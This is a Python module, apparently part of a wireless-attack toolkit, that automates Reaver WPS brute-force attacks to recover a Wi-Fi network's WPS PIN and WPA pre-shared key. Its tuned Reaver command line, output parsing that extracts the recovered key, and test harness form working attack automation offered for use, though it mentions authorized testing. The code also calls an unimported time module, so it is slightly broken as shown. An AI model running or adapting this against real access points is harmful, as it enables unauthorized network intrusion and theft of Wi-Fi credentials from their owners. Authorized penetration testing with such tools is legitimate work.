# backend/plugins/wps_attack.py
"""
Module: wps_attack
Wraps the Reaver tool to perform WPS (Wi-Fi Protected Setup) brute-force attacks
to recover the WPA/WPA2 PSK (Pre-Shared Key) from a vulnerable access point.
This module requires root privileges and Reaver to be installed.
"""
import subprocess
import logging
import os
import shutil # For checking tool availability
import sys # For __main__ test block
from typing import Dict, Any, Optional, List

# Attempt to import from local package structure
try:
    from .. import config # For APP_BASE_DIR to define default output_dir
    from ..core.event_logger import log_event
    from ..core.network_utils import interface_exists, is_monitor_mode
except ImportError:
    # Fallback for direct execution or different environment setups
    logger_fallback = logging.getLogger(__name__)
    logger_fallback.warning("Running WPSAttack with fallback imports. Ensure necessary modules are accessible.")
    class DummyConfigWPS: # Renamed to avoid conflict
        APP_BASE_DIR = os.path.abspath(".") # Default to current dir for fallback
    config = DummyConfigWPS() # type: ignore

    def log_event(event_type: str, data: Dict[str, Any]) -> None: # type: ignore
        print(f"DUMMY_LOG_EVENT: {event_type} - {data}")

    def interface_exists(iface_name: str) -> bool: return True # Assume exists for basic test
    def is_monitor_mode(iface_name: str) -> bool: return True # Assume monitor mode for basic test

logger = logging.getLogger(__name__)

class WPSAttack:
    """
    Manages and executes a WPS PIN attack using the Reaver tool.

    This class automates the process of launching Reaver against a target BSSID
    on a specified monitor mode interface. It handles process management,
    output logging, and cleanup.
    """

    def __init__(self,
                 iface: str,
                 target_bssid: str,
                 channel: Optional[int] = None,
                 output_dir: Optional[str] = None) -> None:
        """
        Initializes the WPSAttack instance.

        Args:
            iface: The name of the wireless interface in monitor mode (e.g., 'wlan0mon').
            target_bssid: The BSSID (MAC address) of the target WPS-enabled Access Point.
            channel: Optional. The specific channel of the target AP. If not provided, Reaver might
                     attempt to determine it or scan, which can be slower.
            output_dir: Optional. Directory to store Reaver session files and logs.
                        Defaults to a subdirectory within `config.APP_BASE_DIR` or './wps_output/'.
        """
        self.iface: str = iface
        self.bssid: str = target_bssid
        self.channel: Optional[int] = channel

        if output_dir is None:
            # Try to use APP_BASE_DIR from config, otherwise default to local ./wps_output
            base_path = getattr(config, 'APP_BASE_DIR', '.')
            self.output_dir: str = os.path.join(base_path, 'wps_sessions', self.bssid.replace(":", ""))
        else:
            self.output_dir = output_dir

        self.process: Optional[subprocess.Popen] = None # To store the Reaver Popen object
        self.reaver_log_file: str = os.path.join(self.output_dir, f'reaver_{self.bssid.replace(":", "")}_{time.strftime("%Y%m%d%H%M%S")}.log')

        # Check for Reaver tool immediately
        self.reaver_path: Optional[str] = shutil.which('reaver')
        if not self.reaver_path:
            msg = "'reaver' command not found. WPSAttack functionality will be disabled. Please install Reaver."
            logger.error(msg)
            log_event("wps_attack_init_failed", {"reason": "Reaver not found"})
            # Consider raising an exception if Reaver is absolutely critical for the class to be useful
            # raise RuntimeError(msg)
        else:
            logger.info(f"Reaver found at: {self.reaver_path}")

        try:
            os.makedirs(self.output_dir, exist_ok=True)
            logger.debug(f"Ensured WPS attack output directory exists: '{self.output_dir}'")
        except OSError as e:
            logger.error(f"Failed to create output directory '{self.output_dir}': {e}", exc_info=True)
            log_event("wps_attack_init_failed", {"reason": f"Failed to create output directory: {e}"})
            # If dir creation fails, subsequent operations will likely fail. Consider raising.
            # raise # Re-raise the OSError

        logger.info(f"WPSAttack initialized: Interface='{self.iface}', BSSID='{self.bssid}', Channel={self.channel if self.channel else 'Auto'}, OutputDir='{self.output_dir}'")
        log_event("wps_attack_init", {"interface": self.iface, "target_bssid": self.bssid, "channel": self.channel, "output_dir": self.output_dir})


    def run(self, timeout: int = 7200, additional_options: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Starts the Reaver WPS attack against the target BSSID.

        Args:
            timeout: Overall timeout in seconds for the Reaver process. Defaults to 7200s (2 hours).
                     Reaver can run for a very long time.
            additional_options: Optional list of additional command-line arguments for Reaver.

        Returns:
            A dictionary containing the status and outcome of the attack:
            {
                "status": "completed" | "failed" | "timeout" | "error",
                "message": "Descriptive message.",
                "target_bssid": self.bssid,
                "interface": self.iface,
                "log_file": self.reaver_log_file,
                "command": ["executed", "command"],
                "return_code": Optional[int],
                "wps_pin": Optional[str], // If found
                "wpa_psk": Optional[str]  // If found
            }
        """
        if not self.reaver_path:
            msg = "'reaver' command not found. Cannot start WPS attack."
            logger.error(msg)
            return {"status": "error", "message": msg, "target_bssid": self.bssid, "interface": self.iface}

        if not interface_exists(self.iface):
            msg = f"Interface '{self.iface}' does not exist. Cannot start WPS attack."
            logger.error(msg)
            log_event("wps_attack_failed", {"interface": self.iface, "target_bssid": self.bssid, "reason": "Interface not found"})
            return {"status": "error", "message": msg, "target_bssid": self.bssid, "interface": self.iface}

        if not is_monitor_mode(self.iface):
            msg = f"Interface '{self.iface}' is not in monitor mode. Reaver requires monitor mode."
            logger.warning(msg) # Log as warning, Reaver might attempt to set it or fail.
            log_event("wps_attack_warning", {"interface": self.iface, "target_bssid": self.bssid, "reason": "Interface not in monitor mode"})


        cmd: List[str] = [
            self.reaver_path,
            '-i', self.iface,
            '-b', self.bssid,
            '-vvv',               # Very verbose output for detailed logging
            '-S',                 # Use small DH keys to improve compatibility (can be slower)
            '--fail-wait=360',    # Wait 360s after AP locks up before trying again
            # Reaver automatically saves session to /usr/local/etc/reaver/<BSSID>.wpc by default
            # To use a custom session dir/name, use --session option.
            # For now, relying on default session handling and focusing on log output.
            # Outputting to a log file is good for post-analysis, Reaver also prints to stdout.
            # Consider if Reaver's internal logging via -o is redundant if we capture stdout,
            # but -o might provide more structured log data.
            # For now, let's assume we capture stdout/stderr and Reaver's default session saving is okay.
            # If specific log parsing from Reaver's file is needed, this would change.
            # '-o', self.reaver_log_file # Reaver's own log file (might be useful but also noisy)
        ]
        if self.channel:
            cmd.extend(['-c', str(self.channel)])

        if additional_options:
            cmd.extend(additional_options)

        logger.info(f"Starting WPS attack. Executing: {' '.join(cmd)}")
        log_event("wps_attack_started", {"interface": self.iface, "target_bssid": self.bssid, "command": ' '.join(cmd), "reaver_log_file_planned": self.reaver_log_file})

        # Prepare a dictionary to hold results, including any found credentials
        attack_result: Dict[str, Any] = {
            "status": "unknown", "message": "Attack initiated.",
            "target_bssid": self.bssid, "interface": self.iface,
            "log_file": self.reaver_log_file, # Where Reaver might save its own log if -o was used
            "command": cmd, "return_code": None,
            "wps_pin": None, "wpa_psk": None,
            "full_output": [] # Store lines of output
        }

        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, # Redirect stderr to stdout for unified capture
                text=True,
                bufsize=1, # Line-buffered
                universal_newlines=True,
                encoding='utf-8', errors='ignore' # Handle potential encoding issues from Reaver
            )
            pid = self.process.pid
            logger.info(f"Reaver process started (PID: {pid}). Monitoring output...")
            log_event("wps_attack_process_started", {"pid": pid, "interface": self.iface, "target_bssid": self.bssid})

            if self.process.stdout:
                for line in iter(self.process.stdout.readline, ''):
                    line_stripped = line.strip()
                    logger.debug(f"Reaver (PID {pid}): {line_stripped}") # Log all Reaver output at debug
                    attack_result["full_output"].append(line_stripped) # Store for result

                    # Check for key phrases indicating success
                    if "[+] WPS PIN:" in line_stripped:
                        try:
                            pin = line_stripped.split("'")[1] # Extracts from 'PIN'
                            attack_result["wps_pin"] = pin
                            logger.info(f"WPS PIN FOUND by Reaver (PID {pid}): {pin}")
                            log_event("wps_attack_pin_found", {"pid": pid, "pin": pin, "target_bssid": self.bssid})
                        except IndexError:
                            logger.warning(f"Could not parse WPS PIN from line: {line_stripped}")

                    if "[+] WPA PSK:" in line_stripped:
                        try:
                            psk = line_stripped.split("'")[1] # Extracts from 'PSK'
                            attack_result["wpa_psk"] = psk
                            logger.info(f"WPA PSK FOUND by Reaver (PID {pid}): {psk}")
                            log_event("wps_attack_psk_found", {"pid": pid, "psk": psk, "target_bssid": self.bssid})
                            # If PSK is found, we can often terminate early
                            logger.info(f"WPA PSK found, terminating Reaver early (PID: {pid}).")
                            self.shutdown() # Call shutdown to terminate and cleanup
                            break # Exit loop

            # Wait for process to complete, but with a timeout
            # self.process.wait() would block indefinitely if Reaver hangs and stdout pipe isn't read to EOF.
            # The loop above reads stdout. If that loop finishes because Reaver process ends, poll() will give RC.
            # If loop finishes due to `break` (key found), shutdown() is called.
            # This Popen.wait() is for the case where Reaver finishes without finding key, or if timeout occurs.
            if self.process: # Check if process still exists (might have been cleared by shutdown)
                self.process.wait(timeout=timeout) # The main timeout for the whole operation
                attack_result["return_code"] = self.process.returncode
                logger.info(f"Reaver process (PID: {pid}) finished with exit code {attack_result['return_code']}.")

            if attack_result["wpa_psk"]: # If PSK was found
                attack_result["status"] = "success_psk_found"
                attack_result["message"] = f"WPA PSK recovered: {attack_result['wpa_psk']}"
            elif attack_result["wps_pin"]: # If only PIN was found
                attack_result["status"] = "success_pin_found"
                attack_result["message"] = f"WPS PIN recovered: {attack_result['wps_pin']}. PSK may also be in logs or attack can be resumed."
            else:
                attack_result["status"] = "completed_no_key"
                attack_result["message"] = "Reaver finished its session or was stopped; no key found in output stream."

            log_event("wps_attack_completed_session", attack_result)

        except subprocess.TimeoutExpired:
            logger.warning(f"WPS attack (Reaver PID: {self.process.pid if self.process else 'N/A'}) timed out after {timeout}s. Terminating process.")
            self.shutdown() # Ensure process is terminated and cleaned up
            attack_result.update({"status": "timeout", "message": "WPS attack timed out."})
            log_event("wps_attack_failed", {**attack_result, "reason": "TimeoutExpired"})
        except FileNotFoundError: # Should be caught by self.reaver_path check earlier, but for safety
            msg = f"Command 'reaver' not found. Please ensure Reaver is installed and in PATH."
            logger.error(msg, exc_info=True)
            attack_result.update({"status": "error", "message": msg})
            log_event("wps_attack_failed", {**attack_result, "reason": "Reaver not found (during run)"})
        except Exception as e:
            msg = f"An unexpected error occurred during WPS attack: {str(e)}"
            logger.error(msg + f" Command: '{' '.join(cmd)}'", exc_info=True)
            attack_result.update({"status": "error", "message": msg, "exception_type": type(e).__name__})
            log_event("wps_attack_failed", {**attack_result, "reason": "Unexpected exception"})
            # Ensure cleanup if process was started
            if self.process and self.process.poll() is None:
                self.shutdown()
        finally:
            # Ensure stdout pipe is closed if process was started
            if self.process and self.process.stdout and not self.process.stdout.closed:
                self.process.stdout.close()
            # Process object should be cleared by shutdown() or if Popen failed.
            # For safety, if it's still here and not None (e.g. exception before shutdown call)
            if self.process and self.process.poll() is None:
                 logger.warning(f"Reaver process (PID: {self.process.pid}) still seems to be running in final finally block. Attempting shutdown.")
                 self.shutdown()
            self.process = None # Ensure it's cleared

        # Join accumulated output lines into a single string for the return dict
        attack_result["full_output"] = "\n".join(attack_result["full_output"])
        return attack_result

    def shutdown(self) -> None:
        """
        Stops an active Reaver attack process, if one is running.
        Sends SIGTERM, then SIGKILL if necessary. This method is idempotent.
        """
        logger.info("WPSAttack shutdown requested.")
        if self.process and self.process.poll() is None: # If Popen object exists and process is running
            pid = self.process.pid
            logger.info(f"Attempting to terminate running Reaver process (PID: {pid})...")
            log_event("wps_attack_shutdown_initiated", {"pid": pid, "interface": self.iface, "target_bssid": self.bssid})
            self.process.terminate() # Send SIGTERM
            try:
                self.process.wait(timeout=10) # Allow 10 seconds for graceful exit
                logger.info(f"Reaver process (PID: {pid}) terminated successfully on shutdown (exit code {self.process.returncode}).")
                log_event("wps_attack_shutdown_complete", {"pid": pid, "exit_code": self.process.returncode, "method": "terminate"})
            except subprocess.TimeoutExpired:
                logger.warning(f"Reaver process (PID: {pid}) did not terminate gracefully after 10s. Killing.")
                self.process.kill() # Force kill
                try:
                    self.process.wait(timeout=5) # Wait for kill to complete
                    logger.info(f"Reaver process (PID: {pid}) killed on shutdown (exit code {self.process.returncode}).")
                    log_event("wps_attack_shutdown_complete", {"pid": pid, "exit_code": self.process.returncode, "method": "kill"})
                except subprocess.TimeoutExpired:
                    logger.error(f"Failed to get return code for killed Reaver process (PID: {pid}) during shutdown.")
                    log_event("wps_attack_shutdown_failed", {"pid": pid, "reason": "Failed to get exit code after kill"})
                except Exception as e_kill_wait:
                     logger.error(f"Error waiting for killed Reaver process (PID: {pid}) to exit: {e_kill_wait}", exc_info=True)
            except Exception as e_term_wait:
                 logger.error(f"Error waiting for terminated Reaver process (PID: {pid}) to exit: {e_term_wait}", exc_info=True)

            # Close pipes if still open
            if self.process.stdout and not self.process.stdout.closed: self.process.stdout.close()
            if self.process.stderr and not self.process.stderr.closed: self.process.stderr.close() # Though stderr is stdout
        else:
            logger.info("WPSAttack shutdown: No Reaver process was found running or it had already completed.")

        self.process = None # Ensure process attribute is cleared
        # No specific event for "noop" shutdown unless desired.


if __name__ == '__main__':
    # --- Test Setup ---
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s [%(levelname)s] [%(name)s:%(lineno)d (%(funcName)s)] %(message)s",
        stream=sys.stdout
    )
    logger.info("--- Starting WPS Attack Module Test ---")

    # --- IMPORTANT: Test Prerequisites ---
    # 1. Root Privileges: This script MUST be run as root (or with `sudo`).
    # 2. Monitor Mode Interface: A wireless interface capable of and currently IN monitor mode.
    #    (e.g., use `sudo airmon-ng start wlan0` to create `wlan0mon`).
    # 3. Target AP: A WPS-enabled Access Point BSSID that you have permission to test against.
    #    WPS attacks can be very disruptive and slow.
    # 4. Reaver Tool: `reaver` must be installed and in the system PATH.
    # ---

    # ** MODIFY THESE VALUES FOR YOUR ACTUAL TEST ENVIRONMENT **
    test_monitor_interface = "mon0_interface_placeholder"  # e.g., "wlan0mon"
    test_target_bssid = "AA:BB:CC:DD:EE:FF"            # Replace with a real BSSID
    test_target_channel = None                         # Optional: e.g., 6, or None for auto

    logger.info(f"--- Test Configuration ---")
    logger.info(f"Monitor Interface: '{test_monitor_interface}'")
    logger.info(f"Target BSSID: '{test_target_bssid}'")
    logger.info(f"Target Channel: {test_target_channel if test_target_channel else 'Auto'}")

    if "mon0_interface_placeholder" == test_monitor_interface or not test_monitor_interface:
        logger.critical("CRITICAL TEST SETUP ERROR: 'test_monitor_interface' is a placeholder or empty.")
        logger.critical("Please update this variable in the script to your actual wireless interface in monitor mode.")
        sys.exit(1)

    if "AA:BB:CC:DD:EE:FF" == test_target_bssid or len(test_target_bssid) != 17:
        logger.critical("CRITICAL TEST SETUP ERROR: 'test_target_bssid' is a placeholder or invalid.")
        logger.critical("Please update this variable to a valid BSSID of a target AP you are authorized to test.")
        sys.exit(1)

    wps_attacker = WPSAttack(
        iface=test_monitor_interface,
        target_bssid=test_target_bssid,
        channel=test_target_channel
        # Example: output_dir=os.path.join(config.APP_BASE_DIR, "test_wps_sessions")
    )

    if not wps_attacker.reaver_path:
        logger.error("Reaver tool not found by WPSAttack class. Cannot proceed with test.")
        sys.exit(1)

    logger.info(f"\n--- Test 1: Running 'reaver --help' (Basic Check) ---")
    try:
        help_process = subprocess.run([wps_attacker.reaver_path, '--help'], capture_output=True, text=True, timeout=10)
        logger.info("'reaver --help' executed successfully.")
        logger.debug(f"Reaver --help stdout (first 500 chars):\n{help_process.stdout[:500]}")
        if help_process.stderr:
            logger.debug(f"Reaver --help stderr:\n{help_process.stderr}")
    except Exception as e_help:
        logger.error(f"Failed to run 'reaver --help': {e_help}", exc_info=True)
        logger.error("This suggests Reaver is not correctly installed or accessible. Aborting further tests.")
        sys.exit(1)

    logger.info("\n--- Test 2: Attempting Short WPS Attack (Simulated - CAUTION if uncommented) ---")
    logger.warning("A full WPS attack can take many hours and be disruptive.")
    logger.warning("The following full attack test is commented out by default for safety.")
    logger.warning("To run a very short live test (e.g., 30 seconds), uncomment the block below.")
    logger.warning(f"This will target BSSID: {test_target_bssid} on interface: {test_monitor_interface}.")
    logger.warning("Ensure you have permission and understand the implications.")

    # --- UNCOMMENT BELOW TO RUN A SHORT LIVE TEST (requires a vulnerable target) ---
    # test_attack_timeout = 30 # Very short timeout for testing purposes
    # attack_result_dict = {}
    # try:
    #     logger.info(f"Starting a SHORT WPS attack for {test_attack_timeout} seconds...")
    #     # Example of adding a custom option like --pixie-dust if desired for specific tests
    #     # attack_result_dict = wps_attacker.run(timeout=test_attack_timeout, additional_options=['-K', '1']) # -K 1 is for Pixie Dust
    #     attack_result_dict = wps_attacker.run(timeout=test_attack_timeout)
    # except KeyboardInterrupt:
    #     logger.info("\nCtrl+C detected during short attack test. WPSAttack.shutdown() will be called in finally.")
    #     attack_result_dict = {"status": "interrupted", "message": "Test attack interrupted by user."}
    # except Exception as e_main_run:
    #     logger.error(f"An unexpected exception occurred in __main__ calling wps_attacker.run(): {e_main_run}", exc_info=True)
    #     attack_result_dict = {"status": "exception_in_test_harness", "message": str(e_main_run)}
    # finally:
    #     logger.info("Calling shutdown() in finally block for the short attack test...")
    #     wps_attacker.shutdown() # Ensure Reaver is stopped
    #
    # logger.info(f"\n--- Short Attack Test Summary ---")
    # logger.info(f"Status: {attack_result_dict.get('status')}")
    # logger.info(f"Message: {attack_result_dict.get('message')}")
    # if attack_result_dict.get('wps_pin'):
    #     logger.info(f"WPS PIN: {attack_result_dict['wps_pin']}")
    # if attack_result_dict.get('wpa_psk'):
    #     logger.info(f"WPA PSK: {attack_result_dict['wpa_psk']}")
    # logger.debug(f"Full output from Reaver (if any):\n{attack_result_dict.get('full_output', 'N/A')}")
    # ----------------------------------------------------------------------------

    logger.info("\n--- WPS Attack Module Test Finished ---")
    logger.info("If live attack was run, check Reaver logs and output for details.")
    logger.info(f"Temporary files would have been in a subfolder of: {wps_attacker.output_dir if wps_attacker else os.path.join(getattr(config, 'APP_BASE_DIR', '.'), 'wps_sessions')}")
